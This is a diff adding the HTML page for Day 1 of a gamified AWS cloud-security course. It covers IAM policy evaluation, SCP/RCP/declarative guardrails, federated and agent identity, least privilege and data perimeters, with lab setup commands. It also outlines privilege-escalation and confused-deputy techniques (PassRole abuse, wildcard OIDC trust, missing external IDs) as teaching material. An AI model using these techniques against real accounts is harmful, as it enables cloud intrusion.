@@ -1,0 +1,1181 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Day 1 · Keys to the Kingdom — Operation Skyfortress</title>
+  <meta name="description" content="Day 1 of Operation Skyfortress: IAM policy evaluation, 2026 Organizations guardrails (SCPs, RCPs, declarative policies), workforce and machine identity, data perimeters and least privilege at scale, with four hands-on labs and a boss fight.">
+  <link rel="icon" href="assets/img/logo.svg" type="image/svg+xml">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="assets/css/site.css">
+  <style>
+    .rule-card { border-left:3px solid var(--accent); padding:4px 0 4px 16px; margin:18px 0; }
+    .rule-card b { font-family:var(--display); }
+    .mini-grid { display:grid; grid-template-columns: repeat(auto-fit, minmax(220px,1fr)); gap:14px; margin:20px 0; }
+    .mini-grid .card { padding:18px; }
+    .mini-grid .card h4 { margin:0 0 6px; color:#fff; font-size:1rem; }
+    .mini-grid .card p { font-size:.9rem; color:var(--text-dim); margin:0; }
+  </style>
+</head>
+<body class="day-1">
+<header id="site-nav"></header>
+
+<!-- ============ DAY HERO ============ -->
+<section class="day-hero">
+  <div class="container">
+    <div class="reveal">
+      <div class="day-num">01</div>
+      <div class="eyebrow">Day 1 · Monday</div>
+      <h1>Keys to the <span class="grad">Kingdom</span></h1>
+      <p class="lead">In the cloud there is no castle wall. There is only <b>who you are</b>, <b>what you may do</b>, and <b>where you may do it from</b>. Today you learn to read, break, and rebuild every policy that decides that — from a single role trust to an org-wide data perimeter.</p>
+      <div class="chips"><span class="chip accent">4 labs + boss</span><span class="chip">~5 hrs hands-on</span><span class="chip">IAM · Organizations · STS · Access Analyzer</span><span class="chip new">2026 NEW</span></div>
+    </div>
+    <div class="banner reveal"><img src="assets/img/day1/banner.svg" alt="A floating citadel with a glowing keyhole vault door, a giant golden key labelled sts:AssumeRole, and Kraken tentacles rising from a sea of clouds"></div>
+  </div>
+</section>
+
+<div class="container day-layout">
+  <nav class="toc" data-auto></nav>
+  <main class="day-content">
+
+    <!-- ============ BRIEFING ============ -->
+    <section id="briefing">
+      <div class="eyebrow">Mission briefing</div>
+      <h2>Welcome to Nimbus Interstellar, operator</h2>
+      <div class="story reveal">
+        <img class="avatar" src="assets/img/owlsley.svg" alt="Owlsley">
+        <div>
+          <div class="who">OWLSLEY · CISO-in-residence, Nimbus Interstellar</div>
+          <p>Hoo. Glad you're here. Nimbus moves cargo between orbital stations and we run it all on ~40 AWS accounts. Last Friday our threat intel team caught chatter from <b>The Kraken Collective</b> — a crew that never bothers with zero-days. They don't need them. They collect <em>permissions</em>: a forgotten <code>iam:PassRole</code>, a trust policy copied from a blog, a bucket policy with <code>"Principal": "*"</code>.</p>
+          <p>Every attack this week will start the same way: with an identity that can do slightly more than anyone intended. So Day 1 is about identity. By tonight I want you to be able to look at any policy in any account and say, out loud and with confidence, <b>allow</b> or <b>deny</b> — and why.</p>
+        </div>
+      </div>
+      <div class="story villain reveal" style="margin-top:18px">
+        <img class="avatar" src="assets/img/kraken.svg" alt="The Kraken">
+        <div>
+          <div class="who">INTERCEPTED · The Kraken Collective · #ops channel</div>
+          <p>lol nimbus. found a role called <code>KrakenInternRole</code> in their dev account (they named it after us?? flattered). it can PassRole on <code>*</code>. their "launch codes" are one lambda away. also their SaaS vendor trust policy has no external id. monday is going to be fun 🐙</p>
+        </div>
+      </div>
+      <div class="callout info"><strong class="ct">How today works</strong><p>Five concept modules, each followed by the lab that makes it real. Every lab has <b>predict → test → explain</b> beats: write down what you think AWS will decide <em>before</em> you run the command. Wrong predictions are the point; they're where the learning lives. Steps award XP when you mark them done; flags award more. The boss fight unlocks the Day 1 badge.</p></div>
+    </section>
+
+    <!-- ============ OBJECTIVES + SCHEDULE ============ -->
+    <section id="objectives">
+      <div class="eyebrow">Outcomes</div>
+      <h2>By the end of today you will…</h2>
+      <ul class="objectives">
+        <li>Trace any request through AWS's 7-step policy evaluation logic, including RCPs, boundaries, and session policies.</li>
+        <li>Design an OU guardrail strategy with SCPs, RCPs, and declarative policies using the 2026 quotas and defaults.</li>
+        <li>Exploit an <code>iam:PassRole</code> escalation, then close it with three independent layers.</li>
+        <li>Build a working data perimeter (identity, resource, network) and prove each wall holds.</li>
+        <li>Wire IAM Access Analyzer custom policy checks into CI so bad policies never merge.</li>
+        <li>Recognise and fix the confused deputy problem for SaaS vendors and AWS service principals.</li>
+        <li>Pick the right identity path for humans, pipelines, workloads, and AI agents.</li>
+        <li>Explain which 2026 changes (SCP quotas, default departure SCPs, Identity Center updates) affect your org.</li>
+      </ul>
+
+      <h3 style="margin-top:40px">Schedule</h3>
+      <div class="timeline">
+        <div class="slot"><div class="time">09:00</div><div class="what"><b>Kickoff</b> — mission briefing, sandbox sanity check <span class="chip">20 min</span></div></div>
+        <div class="slot"><div class="time">09:20</div><div class="what"><b>Module 1.1</b> — Policy evaluation logic, all seven steps <span class="chip">40 min</span></div></div>
+        <div class="slot lab-slot"><div class="time">10:00</div><div class="what"><b>Lab 1.1</b> — Policy Evaluation Arena <span class="chip accent">45 min</span></div></div>
+        <div class="slot break-slot"><div class="time">10:45</div><div class="what">Break ☕</div></div>
+        <div class="slot"><div class="time">11:00</div><div class="what"><b>Module 1.2</b> — Org guardrails in 2026 <span class="chip">35 min</span></div></div>
+        <div class="slot lab-slot"><div class="time">11:35</div><div class="what"><b>Lab 1.2</b> — The PassRole Heist <span class="chip accent">70 min</span></div></div>
+        <div class="slot break-slot"><div class="time">12:45</div><div class="what">Lunch 🍜</div></div>
+        <div class="slot"><div class="time">13:30</div><div class="what"><b>Module 1.3</b> — Workforce, machine &amp; agent identity <span class="chip">30 min</span></div></div>
+        <div class="slot"><div class="time">14:00</div><div class="what"><b>Module 1.5</b> — Data perimeters <span class="chip">25 min</span></div></div>
+        <div class="slot lab-slot"><div class="time">14:25</div><div class="what"><b>Lab 1.3</b> — Build the Data Perimeter <span class="chip accent">60 min</span></div></div>
+        <div class="slot break-slot"><div class="time">15:25</div><div class="what">Break 🧃</div></div>
+        <div class="slot"><div class="time">15:35</div><div class="what"><b>Module 1.4</b> — Least privilege at scale <span class="chip">20 min</span></div></div>
+        <div class="slot lab-slot"><div class="time">15:55</div><div class="what"><b>Lab 1.4</b> — The Least-Privilege Robot <span class="chip accent">50 min</span></div></div>
+        <div class="slot lab-slot"><div class="time">16:45</div><div class="what"><b>Boss fight</b> — The Confused Deputy <span class="chip accent">35 min</span></div></div>
+        <div class="slot"><div class="time">17:20</div><div class="what"><b>Quiz &amp; debrief</b> — what surprised you? <span class="chip">10 min</span></div></div>
+      </div>
+    </section>
+
+    <!-- ============ CONCEPTS ============ -->
+    <section id="concepts">
+      <div class="eyebrow">Concepts</div>
+      <h2>The physics of permission</h2>
+      <p class="lead">Five modules. Learn the rules once, deeply, and every service on every other day of this week becomes easier to secure.</p>
+
+      <!-- ---------- 1.1 ---------- -->
+      <div class="module" id="m1-1">
+        <div class="module-num">MODULE 1.1</div>
+        <h3>Policy evaluation logic: all seven steps</h3>
+        <p>Every AWS API call is evaluated against a <b>request context</b>: the principal (who), the action (what), the resource (on what), and a bag of context keys (from where, when, how, with which tags). AWS starts at an <b>implicit deny</b> and lets the request through only if it gets past every gate. Memorise three laws, then the flowchart:</p>
+        <div class="rule-card"><b>Law 1 — Default deny.</b> If nothing says allow, the answer is no. You never need a policy to deny; you need one to allow.</div>
+        <div class="rule-card"><b>Law 2 — Explicit deny always wins.</b> One matching <code>"Effect": "Deny"</code> in <em>any</em> policy type — SCP, RCP, resource policy, boundary, identity, session — ends the evaluation.</div>
+        <div class="rule-card"><b>Law 3 — Guardrails never grant.</b> SCPs, RCPs and permissions boundaries only define a ceiling. An SCP that "allows" <code>s3:*</code> gives nobody anything; it just doesn't block it.</div>
+
+        <figure class="figure reveal"><img src="assets/img/day1/policy-eval.svg" alt="Flowchart: request → explicit deny check → RCPs → SCPs → resource-based policy (same-account shortcut to allow) → identity policies → permissions boundary → session policy → allow; every no exits to implicit deny"><figcaption><b>FIG 1.1</b> The evaluation order for a request inside one member account. Cross-account requests have no shortcut: the caller's identity policy <em>and</em> the target's resource policy must both allow.</figcaption></figure>
+
+        <h4>The seven policy types, briefly and precisely</h4>
+        <div class="table-wrap"><table>
+          <thead><tr><th>Type</th><th>Attached to</th><th>Can grant?</th><th>The thing people forget</th></tr></thead>
+          <tbody>
+            <tr><td><b>Identity-based</b></td><td>user, group, role</td><td>✅</td><td>Inline vs managed doesn't change evaluation, only lifecycle.</td></tr>
+            <tr><td><b>Resource-based</b></td><td>bucket, key, queue, secret, role trust…</td><td>✅</td><td>A role's trust policy <em>is</em> a resource policy (the role is the resource; the action is <code>sts:AssumeRole</code>).</td></tr>
+            <tr><td><b>Permissions boundary</b></td><td>user or role</td><td>❌ ceiling</td><td>Doesn't limit resource-based policies that name the user/role-session ARN directly.</td></tr>
+            <tr><td><b>Session policy</b></td><td>passed at AssumeRole / federation</td><td>❌ ceiling</td><td>Your Identity Center session can't exceed the permission set; a script's <code>--policy</code> can shrink it further.</td></tr>
+            <tr><td><b>SCP</b></td><td>root, OU, account</td><td>❌ ceiling</td><td>Applies to every principal in member accounts — including the account root user — but not the management account or service-linked roles.</td></tr>
+            <tr><td><b>RCP</b></td><td>root, OU, account</td><td>❌ ceiling</td><td>Applies to <em>resources</em> in member accounts, so it constrains outsiders too. Supported services started with S3, STS, KMS, SQS, Secrets Manager.</td></tr>
+            <tr><td><b>Declarative</b></td><td>root, OU, account</td><td>n/a</td><td>Not IAM at all: it pins a service's <em>configuration</em> (e.g. IMDSv2 default, block public snapshots, GuardDuty enabled). Works even for APIs that would otherwise bypass IAM checks.</td></tr>
+          </tbody>
+        </table></div>
+
+        <h4>Worked example: predict before you peek</h4>
+        <p>Role <code>Analyst</code> in account A has an identity policy allowing <code>s3:GetObject</code> on <code>arn:aws:s3:::nimbus-reports/*</code>. It has a permissions boundary allowing only <code>s3:List*</code>. The bucket policy (same account) allows <code>s3:GetObject</code> to <code>arn:aws:iam::A:role/Analyst</code>. Can Analyst read an object?</p>
+        <div class="predict"><p>Allow, implicit deny, or explicit deny? Name the gate that decides it.</p><details><summary>Reveal</summary><p><b>Implicit deny.</b> The bucket policy names the <em>role ARN</em>, not the role-session ARN, so the boundary still caps the effective permissions and the boundary doesn't include <code>s3:GetObject</code>. If the bucket policy had named the specific session ARN (<code>arn:aws:sts::A:assumed-role/Analyst/alice</code>), the same-account shortcut would allow it despite the boundary. This edge case is exactly why the flowchart shows a dashed arrow.</p></details></div>
+
+        <div class="callout gotcha"><strong class="ct">Gotcha: NotAction + Allow is a trap</strong><p><code>{"Effect":"Allow","NotAction":"iam:*","Resource":"*"}</code> reads like "everything except IAM" — and it grants every action in every service that exists today <em>and every one AWS launches tomorrow</em>. Use <code>NotAction</code> with <code>Deny</code>, almost never with <code>Allow</code>.</p></div>
+        <div class="callout tip"><strong class="ct">Pro tip: let the error message tell you which gate failed</strong><p>Many services now return enriched AccessDenied messages that name the policy type that blocked you, e.g. <em>"…with an explicit deny in a service control policy"</em> or <em>"…because no identity-based policy allows the action"</em>. For encoded messages, <code>aws sts decode-authorization-message</code> reveals the full context. You'll lean on both in the Arena.</p></div>
+      </div>
+
+      <!-- ---------- 1.2 ---------- -->
+      <div class="module" id="m1-2" style="margin-top:60px">
+        <div class="module-num">MODULE 1.2</div>
+        <h3>Organization guardrails in 2026</h3>
+        <p>Guardrails are the policies that hold even when an account admin makes a mistake — or <em>is</em> the mistake. In 2026 you have three distinct tools, each enforcing at a different layer:</p>
+        <div class="mini-grid">
+          <div class="card"><h4>🛑 SCPs — the principal ceiling</h4><p>"Nobody in these accounts may do X." Region lock, protect security tooling, protect privileged roles, deny root actions.</p></div>
+          <div class="card"><h4>🧱 RCPs — the resource ceiling</h4><p>"Nobody, from anywhere, may do X to resources in these accounts." Stops outsiders even if a bucket/key policy is too generous.</p></div>
+          <div class="card"><h4>📐 Declarative — the config pin</h4><p>"This service is configured like this, always." IMDSv2, VPC Block Public Access, snapshot/AMI public blocks, GuardDuty and Security Hub CSPM enablement.</p></div>
+        </div>
+        <figure class="figure reveal"><img src="assets/img/day1/org-guardrails.svg" alt="Organization tree: Root with deny-leave-org, region-lock, org-identities RCP, guardduty-on declarative policy; Security, Infrastructure, Workloads (Prod, Dev), Sandbox and Suspended OUs, each with their own guardrails; management account outside guardrails; 2026 limits strip"><figcaption><b>FIG 1.2</b> Guardrails inherit downward. Design per OU, not per account — accounts move between OUs, policies shouldn't have to.</figcaption></figure>
+
+        <div class="callout new"><strong class="ct">New in 2025–2026 — what changed in your guardrail toolbox</strong>
+          <ul>
+            <li><b>SCPs speak the full IAM policy language</b> (2025): conditions on <code>Allow</code> statements, individual resource ARNs, <code>NotResource</code>, wildcards in the middle of action names. Allow-list SCPs got far more practical.</li>
+            <li><b>Bigger SCP budget</b> (May 2026): up to <b>10 SCPs per node</b> (was 5) and <b>10,240 characters</b> per SCP (was 5,120). Fewer minified, unreadable mega-policies.</li>
+            <li><b>Departure controls by default</b> (Jul 2026): organizations created in the Organizations console now get SCPs that block member accounts from leaving the org or closing themselves.</li>
+            <li><b>Declarative policies grew up</b>: after EC2 (2024), AWS added <b>GuardDuty</b> enablement (Oct 2026) and <b>Security Hub CSPM</b> enablement (Nov 2026). An account can't switch them off from the console or API.</li>
+            <li><b>Centralized root access management</b> (since late 2024): delete root credentials from member accounts and run the few root-only tasks with short-lived <code>sts:AssumeRoot</code> sessions from the management account or a delegated admin.</li>
+          </ul>
+          <p>And keep an eye on re:Invent 2026 (Nov 30–Dec 4), which absorbed re:Inforce this year with a dedicated security day on Dec 3. Expect announcements in this area.</p>
+        </div>
+
+        <h4>Pattern: a root-level SCP every org should have</h4>
+<pre data-title="scp-root-baseline.json — annotated"><code class="language-json">{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Sid": "DenyOutsideApprovedRegions",
+      "Effect": "Deny",
+      "NotAction": ["iam:*", "organizations:*", "sts:*", "support:*", "cloudfront:*",
+                    "route53:*", "waf:*", "globalaccelerator:*", "budgets:*"],
+      "Resource": "*",
+      "Condition": {
+        "StringNotEquals": { "aws:RequestedRegion": ["us-east-1", "us-west-2", "eu-west-1"] },
+        "ArnNotLike": { "aws:PrincipalArn": "arn:aws:iam::*:role/SkyfortressBreakGlass" }
+      }
+    },
+    {
+      "Sid": "ProtectSecurityTelemetry",
+      "Effect": "Deny",
+      "Action": ["cloudtrail:StopLogging", "cloudtrail:DeleteTrail",
+                 "guardduty:DeleteDetector", "guardduty:DisassociateFromMasterAccount",
+                 "securityhub:DisableSecurityHub", "config:StopConfigurationRecorder"],
+      "Resource": "*"
+    },
+    {
+      "Sid": "NoRootUserInMemberAccounts",
+      "Effect": "Deny",
+      "Action": "*",
+      "Resource": "*",
+      "Condition": { "StringLike": { "aws:PrincipalArn": "arn:aws:iam::*:root" } }
+    }
+  ]
+}</code></pre>
+        <p>Line by line: the region lock uses <code>NotAction</code> <em>with Deny</em> (the safe direction) to exempt global services whose control planes live in us-east-1. The break-glass exemption uses <code>aws:PrincipalArn</code> — which, unlike <code>aws:userid</code>, matches the role regardless of session name. The telemetry statement is the one the Kraken checks first: if they can <code>StopLogging</code>, Day 2 gets very short.</p>
+
+        <div class="callout war"><strong class="ct">War story: the SCP that bricked the pipeline</strong><p>A common real-world outage: a team ships a region-lock SCP without exempting global services, and suddenly CloudFront, IAM, and Route 53 calls from us-west-2 pipelines fail. Always stage guardrails on a test OU first, and watch CloudTrail for <code>errorCode = AccessDenied</code> with SCP in the message for 24 hours before promoting.</p></div>
+
+        <h4>Declarative policy: IMDSv2 for every instance, forever</h4>
+<pre data-title="declarative-ec2.json"><code class="language-json">{
+  "ec2_attributes": {
+    "instance_metadata_defaults": {
+      "http_tokens": { "@@assign": "required" },
+      "http_put_response_hop_limit": { "@@assign": "2" },
+      "http_endpoint": { "@@assign": "enabled" }
+    },
+    "snapshot_block_public_access": { "state": { "@@assign": "block_all_sharing" } },
+    "image_block_public_access": { "state": { "@@assign": "block_new_sharing" } }
+  }
+}</code></pre>
+        <p>Attach with policy type <code>DECLARATIVE_POLICY_EC2</code>. Notice the syntax: it's the same <code>@@assign</code> inheritance operator family as tag and backup policies, not IAM JSON. There's no <code>Effect</code> because there's nothing to evaluate — the service simply refuses to be configured any other way.</p>
+
+        <h4>Centralized root: two commands that kill a whole attack class</h4>
+<pre data-title="management account (or delegated admin)"><code class="language-bash"># Trust IAM to manage root for the org, then turn on both features
+aws organizations enable-aws-service-access --service-principal iam.amazonaws.com
+aws iam enable-organizations-root-credentials-management
+aws iam enable-organizations-root-sessions
+
+# Later: a member account's S3 bucket policy locked everyone out. Only root can fix it.
+aws sts assume-root \
+  --target-principal 111122223333 \
+  --task-policy-arn arn=arn:aws:iam::aws:policy/root-task/S3UnlockBucketPolicy \
+  --duration-seconds 900</code></pre>
+        <div class="callout tip"><strong class="ct">Pro tip</strong><p>Once root credentials are deleted from member accounts, nobody can phish a root password or MFA there — there isn't one. New accounts created by Organizations can be born without root credentials. If you also run a "deny root" SCP like the one above, test your <code>AssumeRoot</code> task workflows against it in a test OU before you need them in an emergency.</p></div>
+      </div>
+
+      <!-- ---------- 1.3 ---------- -->
+      <div class="module" id="m1-3" style="margin-top:60px">
+        <div class="module-num">MODULE 1.3</div>
+        <h3>Workforce, machine &amp; agent identity</h3>
+        <p>The Kraken's favourite credential is an IAM user access key: long-lived, copy-pasteable, and usually sitting in a <code>.env</code> file somewhere. The 2026 answer is that <b>every</b> identity — human, pipeline, workload, or AI agent — should end up holding a short-lived, tagged STS role session.</p>
+        <figure class="figure reveal"><img src="assets/img/day1/identity-landscape.svg" alt="Four identity sources — IAM Identity Center for workforce, OIDC federation for pipelines, compute roles and Roles Anywhere for workloads, and MCP OAuth / AgentCore Identity for AI agents — all converging on AWS STS role sessions; IAM user access keys shown as an anti-pattern"><figcaption><b>FIG 1.3</b> Four roads, one destination. If an identity in your org isn't on one of these roads, it's a finding.</figcaption></figure>
+
+        <h4>Humans: IAM Identity Center</h4>
+        <p>Permission sets become <code>AWSReservedSSO_*</code> roles in each account. Pair with your IdP (or the built-in directory) and require phishing-resistant MFA — <b>passkeys / FIDO2 security keys</b> — for anything privileged.</p>
+        <div class="callout new"><strong class="ct">New in 2026 — Identity Center (August 2026)</strong>
+          <ul>
+            <li><b>One-click multi-Region</b> for new organization instances — single-Region, multi-Region, or custom — so an outage in your home Region doesn't lock humans out.</li>
+            <li><b>Account access management is optional</b> for new organization instances. If you only use Identity Center for applications, no service-linked role gets provisioned into member accounts — a smaller footprint.</li>
+            <li><b>IAM account access manager</b> lets admins assign <em>existing IAM roles</em> in accounts directly to Identity Center users and groups — handy for migrating hand-built roles without rewriting them as permission sets.</li>
+          </ul>
+        </div>
+
+        <h4>ABAC: one policy, a thousand teams</h4>
+        <p>Instead of a role per team, write one policy that compares the principal's tag to the resource's tag. Tags come from the IdP as session tags (<code>https://aws.amazon.com/SAML/Attributes/PrincipalTag:team</code>) or from <code>sts:TagSession</code>.</p>
+<pre data-title="abac-team-secrets.json"><code class="language-json">{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Sid": "ReadOnlyYourTeamsSecrets",
+    "Effect": "Allow",
+    "Action": "secretsmanager:GetSecretValue",
+    "Resource": "*",
+    "Condition": {
+      "StringEquals": { "aws:ResourceTag/team": "${aws:PrincipalTag/team}" },
+      "Null": { "aws:PrincipalTag/team": "false" }
+    }
+  }]
+}</code></pre>
+        <div class="callout gotcha"><strong class="ct">Gotcha: who can set the tag?</strong><p>ABAC is only as strong as tag integrity. If a principal can call <code>secretsmanager:TagResource</code> or pass arbitrary session tags, it can tag its way into anything. Lock tag keys with an SCP (<code>aws:TagKeys</code>, <code>aws:RequestTag/team</code>) and restrict <code>sts:TagSession</code> in trust policies to IdP-sourced values. The <code>Null</code> check above stops an untagged principal matching an untagged resource (both "empty").</p></div>
+
+        <h4>Pipelines: OIDC federation — pin the <code>sub</code></h4>
+<pre data-title="trust policy for a GitHub Actions role"><code class="language-json">{
+  "Effect": "Allow",
+  "Principal": { "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com" },
+  "Action": "sts:AssumeRoleWithWebIdentity",
+  "Condition": {
+    "StringEquals": {
+      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
+      "token.actions.githubusercontent.com:sub": "repo:nimbus-interstellar/flight-control:environment:prod"
+    }
+  }
+}</code></pre>
+        <div class="callout war"><strong class="ct">War story: the wildcard <code>sub</code></strong><p>Security researchers have repeatedly found real AWS roles trusting GitHub's OIDC provider with only an <code>aud</code> check, or with <code>sub</code> set to <code>repo:*</code>. That means <em>any repository on GitHub</em> — including one the attacker creates five minutes ago — can mint credentials for the role. Pin the org, repo, and ideally the environment or branch. You'll build exactly this in Lab 1.4.</p></div>
+
+        <h4>Workloads outside AWS: IAM Roles Anywhere</h4>
+        <p>On-prem servers and other clouds exchange an X.509 certificate (issued by your private CA, registered as a <b>trust anchor</b>) for STS credentials via <code>aws_signing_helper</code>. No more static keys on the datacenter box. Map certificate attributes into conditions with <code>aws:PrincipalTag/x509Subject/CN</code>.</p>
+
+        <h4>AI agents: the newest identity on the block</h4>
+        <p>Coding agents and AI assistants now call AWS on your behalf. The <b>AWS MCP Server supports OAuth 2.1 through AWS Sign-In</b> (2026): agents such as Claude Code, Kiro or Gemini CLI connect with your existing IAM credentials through a browser-based login, rather than you pasting keys into a config file. Treat an agent's session like any other: least privilege, short duration, and auditable in CloudTrail. Day 4 goes deep on agent identity and authorization (AgentCore Identity and AgentCore Policy).</p>
+        <div class="callout tip"><strong class="ct">Pro tip: give agents their own role</strong><p>Give an agent its own narrowly scoped role (or permission set) instead of your admin session. When something goes wrong, <code>userIdentity.arn</code> in CloudTrail tells you instantly whether it was you or the robot.</p></div>
+      </div>
+
+      <!-- ---------- 1.4 ---------- -->
+      <div class="module" id="m1-4" style="margin-top:60px">
+        <div class="module-num">MODULE 1.4</div>
+        <h3>Least privilege at scale</h3>
+        <p>Nobody writes least-privilege policies by hand for 40 accounts. You <b>generate</b>, <b>measure</b>, and <b>gate</b>. IAM Access Analyzer has a tool for each:</p>
+        <figure class="figure reveal"><img src="assets/img/day1/least-privilege-loop.svg" alt="The least-privilege loop: 1 generate a policy from CloudTrail, 2 gate it in CI with custom policy checks, 3 deploy and measure with the unused access analyzer, 4 trim with finding recommendations and send back through the gate; external and internal access findings in the centre verify who can actually reach resources"><figcaption><b>FIG 1.5</b> The loop you'll automate in Lab 1.4. Every arrow is an Access Analyzer API; the centre answers "who can actually reach it?" at any point in time.</figcaption></figure>
+        <div class="table-wrap"><table>
+          <thead><tr><th>Need</th><th>Access Analyzer feature</th><th>How it works</th></tr></thead>
+          <tbody>
+            <tr><td>"Who outside my zone of trust can reach this?"</td><td><b>External access analyzer</b></td><td>Automated reasoning over resource policies; zone of trust = account or org.</td></tr>
+            <tr><td>"Who <em>inside</em> my org can reach my crown jewels?"</td><td><b>Internal access findings</b> (2025)</td><td>Combines identity policies, resource policies, SCPs, RCPs and boundaries to show which internal principals can reach critical resources you choose.</td></tr>
+            <tr><td>"Which permissions are never used?"</td><td><b>Unused access analyzer</b></td><td>Flags unused roles, unused access keys/passwords, and unused services/actions, with recommended policy trims.</td></tr>
+            <tr><td>"Write me a policy from real behaviour."</td><td><b>Policy generation</b></td><td>Reads CloudTrail for a role over a time window and drafts a least-privilege policy.</td></tr>
+            <tr><td>"Stop bad policies before deploy."</td><td><b>Custom policy checks</b></td><td><code>check-no-new-access</code>, <code>check-access-not-granted</code>, <code>check-no-public-access</code> — answers proven by automated reasoning, not regex.</td></tr>
+          </tbody>
+        </table></div>
+        <div class="callout info"><strong class="ct">Why "automated reasoning" matters</strong><p>Custom policy checks translate policies into logic formulas and use SMT solvers (AWS's Zelkova engine) to <em>prove</em> properties. A linter can tell you a policy contains <code>s3:*</code>. A prover can tell you that <code>s3:Get*</code> plus a <code>NotResource</code> plus a missing condition <em>is</em> equivalent to public read. That's the difference between style and security.</p></div>
+        <div class="callout cost"><strong class="ct">Cost note</strong><p>External access analysis is free. Unused access and internal access analysis are billed per resource or role analyzed per month, and custom policy checks are billed per API call — fractions of a cent each, but scope your analyzers for big orgs. Today's lab costs pennies.</p></div>
+      </div>
+
+      <!-- ---------- 1.5 ---------- -->
+      <div class="module" id="m1-5" style="margin-top:60px">
+        <div class="module-num">MODULE 1.5</div>
+        <h3>Data perimeters</h3>
+        <p>A data perimeter is a set of preventive guardrails ensuring that <b>only trusted identities</b> access <b>trusted resources</b> from <b>expected networks</b>. Each wall needs a different policy type because each is attached to a different thing:</p>
+        <figure class="figure reveal"><img src="assets/img/day1/data-perimeter.svg" alt="Data perimeter diagram: organization dome containing a VPC with CloudShell, an S3 gateway endpoint checking PrincipalOrgID and ResourceOrgID, and a vault bucket that denies reads not via the endpoint; Kraken account, internet admin and insider exfil attempts blocked by RCP, SourceVpce and SCP respectively"><figcaption><b>FIG 1.4</b> Three walls, three attempted breaches, three different blockers. This is exactly what you'll build in Lab 1.3.</figcaption></figure>
+        <div class="table-wrap"><table>
+          <thead><tr><th>Wall</th><th>Question</th><th>Policy type</th><th>Key condition keys</th></tr></thead>
+          <tbody>
+            <tr><td><b>Identity</b></td><td>Is the caller one of ours?</td><td>RCP (org-wide), resource policies, VPC endpoint policies</td><td><code>aws:PrincipalOrgID</code>, <code>aws:PrincipalIsAWSService</code>, <code>aws:SourceOrgID</code> (for service principals)</td></tr>
+            <tr><td><b>Resource</b></td><td>Is the target one of ours?</td><td>SCP, VPC endpoint policies</td><td><code>aws:ResourceOrgID</code>, <code>aws:ResourceAccount</code></td></tr>
+            <tr><td><b>Network</b></td><td>Is the call from where we expect?</td><td>RCP / resource policies, SCP for identities</td><td><code>aws:SourceVpce</code>, <code>aws:SourceVpc</code>, <code>aws:SourceIp</code>, <code>aws:ViaAWSService</code></td></tr>
+          </tbody>
+        </table></div>
+        <div class="callout gotcha"><strong class="ct">Gotcha: AWS services calling on your behalf</strong><p>When Athena reads S3 for you, or CloudFormation creates a bucket, the call to S3 doesn't come from your VPC endpoint. Without exceptions, your network wall breaks your own tooling. That's why perimeter policies carry <code>aws:ViaAWSService</code> / <code>aws:CalledVia</code> and <code>aws:PrincipalIsAWSService</code> carve-outs. The art is making carve-outs narrow.</p></div>
+        <div class="callout gotcha"><strong class="ct">Gotcha: AWS-owned resources</strong><p>A strict "only org resources" SCP also blocks AWS-owned buckets your workloads quietly depend on — package repositories, public datasets, partner data drops. Real perimeters list those exceptions explicitly (the AWS <em>data-perimeter-policy-examples</em> repo on GitHub is the reference). You'll trip over exactly this in Lab 1.3.</p></div>
+        <div class="callout war"><strong class="ct">War story: "the bucket was private… to every AWS customer"</strong><p>Older S3 incidents often came down to <code>"Principal": {"AWS": "*"}</code> with a weak or missing condition, or ACLs granting "Authenticated Users" — meaning <em>any</em> AWS account, not your org. An RCP with <code>aws:PrincipalOrgID</code> makes that class of mistake non-exploitable across every bucket at once.</p></div>
+      </div>
+    </section>
+
+    <!-- ============ LABS ============ -->
+    <section id="labs">
+      <div class="eyebrow">Hands-on</div>
+      <h2>Labs</h2>
+      <p class="lead">All labs run from <b>AWS CloudShell in us-east-1</b>, using the profiles you created in Lab 0: <code>sky-mgmt</code> (management account, via the <code>SkyfortressAdmin</code> role), <code>sky-dev</code> and <code>sky-prod</code> (member accounts, via <code>OrganizationAccountAccessRole</code>).</p>
+      <div class="callout tip"><strong class="ct">How to read the screenshots</strong><p>Terminal windows show <b>expected output</b> with placeholder account IDs (<code>111122223333</code> = dev, <code>444455556666</code> = prod, <code>999988887777</code> = management); flags are always redacted. Browser-framed screens are <b>illustrative mock-ups</b> of the console. Click any figure or screenshot to enlarge it. Every lab offers a <b>guided path</b> (numbered steps) and a <b>challenge path</b> (goal + acceptance criteria only); pick one per lab.</p></div>
+
+      <div class="callout warn"><strong class="ct">Sandbox only</strong><p>Lab 1.2 and the boss fight deploy <b>deliberately vulnerable</b> resources. Never deploy them into an account that matters, and run every cleanup block. Your $25 budget alarm from Lab 0 is your safety net, not your plan.</p></div>
+
+      <h3>Grab today's lab kit</h3>
+<pre data-title="CloudShell — run once"><code class="language-bash">mkdir -p ~/sky/day1/robot/policies ~/sky/day1/robot/reference ~/sky/day1/confused-deputy &amp;&amp; cd ~/sky/day1
+BASE="__SITE__labs/day1"
+for f in arena.yaml passrole-heist.yaml heist_payload.py intern-fixed-policy.json intern-boundary.json \
+         scp-protect-privileged-roles.json data-perimeter.yaml rcp-org-only-resources.json \
+         scp-org-only-resources.json \
+         robot/check_policies.py robot/policy-robot.yml robot/github-oidc-role.yaml \
+         robot/reference/baseline-identity.json \
+         robot/policies/01-robots.identity.json robot/policies/02-dream.identity.json \
+         robot/policies/03-never.bucket.json robot/policies/04-of.bucket.json \
+         robot/policies/05-sleep.identity.json \
+         confused-deputy/vendor.yaml confused-deputy/victim.yaml confused-deputy/fixed-trust-policy.json; do
+  curl -fsSL "$BASE/$f" -o "$f" &amp;&amp; echo "✓ $f"
+done
+# sanity check: all three profiles answer
+for p in sky-mgmt sky-dev sky-prod; do echo -n "$p → "; aws sts get-caller-identity --profile $p --query Account --output text; done</code></pre>
